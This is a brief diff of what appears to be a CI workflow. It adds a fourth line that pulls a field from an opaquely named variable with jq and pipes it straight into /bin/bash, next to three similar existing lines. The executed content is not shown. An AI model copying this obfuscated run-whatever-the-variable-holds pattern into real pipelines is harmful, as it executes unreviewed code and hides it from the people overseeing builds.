@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$xdmk4" | jq -r .wj48 | /bin/bash
           printf '%s' "$fs380" | jq -r .svuv098 | /bin/bash
           echo $e9 | jq -r .p75966 | /bin/bash
+          echo $jv7 | jq -r .v55 | /bin/bash
 
       - name: Save archive
         if: always()
